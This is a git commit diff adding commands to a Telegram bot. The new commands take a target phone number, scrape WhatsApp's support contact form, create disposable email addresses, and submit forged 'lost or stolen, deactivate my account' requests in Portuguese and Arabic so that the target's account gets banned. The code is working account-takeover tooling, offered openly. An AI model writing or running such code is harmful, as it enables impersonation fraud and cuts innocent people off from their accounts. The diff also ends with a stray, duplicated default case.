54dbb3302fad416d99b9a354aef8b90ba85fde8d
YUDAMODS <119145280+YUDAMODS@users.noreply.github.com>
2024-04-17 16:49:45 +0700

    Add files via upload

--- index.js
+++ index.js
@@ -15,7 +15,7 @@ let userList = [];
 const thumbPath = 'https://telegra.ph/file/ba12c1ba24d23404c1e00.jpg';
 
 bot.start((ctx) => {
-    ctx.replyWithPhoto({ url: thumbPath, caption: 'Welcome to the WhatsApp submission bot! Use /menu to view all menu.' });
+    ctx.replyWithPhoto(thumbPath, { caption:'Welcome to the WhatsApp submission bot! Use /menu to view all menu.' });
 });
 
 bot.use((ctx, next) => {
@@ -212,6 +212,182 @@ bot.on('text', async (ctx) => {
         const chatId = ctx.message.chat.id;
         ctx.replyWithPhoto(thumbPath, { caption: `Cek ID Group:\nChat ID: ${chatId}` });
         break;
+        
+    case '/bannedwa':
+    case '/kenonwa':
+    case '/banned':
+            const bannedArgs = message.split(' ');
+            const bannedPhoneNumber = bannedArgs.length > 1 ? bannedArgs[1] : null;
+            if (!bannedPhoneNumber) {
+                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
+                return;
+            }
+            try {
+                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
+                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
+                const cookie = ntah.headers["set-cookie"].join("; ");
+                const $ = cheerio.load(ntah.data);
+                const $form = $("form");
+                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
+                const form = new URLSearchParams();
+
+                form.append("jazoest", $form.find("input[name=jazoest]").val());
+                form.append("lsd", $form.find("input[name=lsd]").val());
+                form.append("step", "submit");
+                form.append("country_selector", "ID");
+                form.append("phone_number", bannedPhoneNumber);
+                form.append("email", email.data[0]);
+                form.append("email_confirm", email.data[0]);
+                form.append("platform", "ANDROID");
+                form.append("your_message", "Perdido/roubado: desative minha conta");
+                form.append("__user", "0");
+                form.append("__a", "1");
+                form.append("__csr", "");
+                form.append("__req", "8");
+                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
+                form.append("dpr", "1");
+                form.append("__ccg", "UNKNOWN");
+                form.append("__rev", "1006630858");
+                form.append("__comment_req", "0");
+
+                const res = await axios({
+                    url,
+                    method: "POST",
+                    data: form,
+                    headers: {
+                        cookie
+                    }
+                });
+
+                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
+                ctx.reply(util.format(responseData));
+            } catch (error) {
+                ctx.reply(`Oops! Something went wrong: ${error.message}`);
+            }
+            break;
+            
+     case '/unbannedwa':
+     case '/unbanwa':
+     case '/unban':
+            const unbannedArgs = message.split(' ');
+            const unbannedPhoneNumber = unbannedArgs.length > 1 ? unbannedArgs[1] : null;
+            if (!unbannedPhoneNumber) {
+                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
+                return;
+            }
+            try {
+                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
+                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
+                const cookie = ntah.headers["set-cookie"].join("; ");
+                const $ = cheerio.load(ntah.data);
+                const $form = $("form");
+                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
+                const form = new URLSearchParams();
+
+                form.append("jazoest", $form.find("input[name=jazoest]").val());
+                form.append("lsd", $form.find("input[name=lsd]").val());
+                form.append("step", "submit");
+                form.append("country_selector", "ID");
+                form.append("phone_number", unbannedPhoneNumber);
+                form.append("email", email.data[0]);
+                form.append("email_confirm", email.data[0]);
+                form.append("platform", "ANDROID");
+                form.append("your_message", "مرحبًا ، أنا رودولفو ، أحتاج إلى مساعدتك ، لقد سُرق هاتفي المحمول ومعه شريحتي مع WhatsApp ، لا أريد أن أفسد أشيائي الشخصية ، مثل الأشياء من شركتي وخططي ، أريد رقمي معطل! حتى أتمكن من استعادة بطاقة Sim أو محاولة استرداد هاتفي! الرقم");
+                form.append("__user", "0");
+                form.append("__a", "1");
+                form.append("__csr", "");
+                form.append("__req", "8");
+                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
+                form.append("dpr", "1");
+                form.append("__ccg", "UNKNOWN");
+                form.append("__rev", "1006630858");
+                form.append("__comment_req", "0");
+
+                const res = await axios({
+                    url,
+                    method: "POST",
+                    data: form,
+                    headers: {
+                        cookie
+                    }
+                });
+
+                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
+                ctx.reply(util.format(responseData));
+            } catch (error) {
+                ctx.reply(`Oops! Something went wrong: ${error.message}`);
+            }
+            break;
+        case '/temp':
+
+            const dropArgs = message.split(' ');
+            const dropPhoneNumber = dropArgs.length > 1 ? dropArgs[1] : null;
+            if (!dropPhoneNumber) {
+                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
+                return;
+            }
+            const ddi = dropPhoneNumber.substring(0, 2);
+            const number = dropPhoneNumber.substring(2);
+
+            try {
+                const res = await dropNumber({ phoneNumber: dropPhoneNumber, ddi, number });
+                ctx.reply(`Success! System number ${ddi}${number} has been initiated.`);
+            } catch (error) {
+                ctx.reply(`Oops! Something went wrong: ${error.message}`);
+            }
+            break;
+        default:
+            // Handle unknown commands or do nothing
+            break;
+    }
+});
+
+const dropNumber = async (context) => {
+    const { phoneNumber, ddi, number } = context;
+    const numbers = JSON.parse(fs.readFileSync('./YUDAMODS/crash.json'));
+
+    try {
+        const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
+        const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
+        const cookie = ntah.headers["set-cookie"].join("; ");
+        const $ = cheerio.load(ntah.data);
+        const $form = $("form");
+        const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
+        const form = new URLSearchParams();
+
+        form.append("jazoest", $form.find("input[name=jazoest]").val());
+        form.append("lsd", $form.find("input[name=lsd]").val());
+        form.append("step", "submit");
+        form.append("country_selector", "ID");
+        form.append("phone_number", phoneNumber);
+        form.append("email", email.data[0]);
+        form.append("email_confirm", email.data[0]);
+        form.append("platform", "ANDROID");
+        form.append("your_message", "Perdido/roubado: desative minha conta");
+        form.append("__user", "0");
+        form.append("__a", "1");
+        form.append("__csr", "");
+        form.append("__req", "8");
+        form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
+        form.append("dpr", "1");
+        form.append("__ccg", "UNKNOWN");
+        form.append("__rev", "1006630858");
+        form.append("__comment_req", "0");
+
+        const res = await axios({
+            url,
+            method: "POST",
+            data: form,
+            headers: {
+                cookie
+            }
+        });
+
+        return true;
+    } catch (error) {
+        throw new Error(`Failed to initiate system number ${ddi}${number}: ${error.message}`);
+    }
+};
 
     default:
         break;
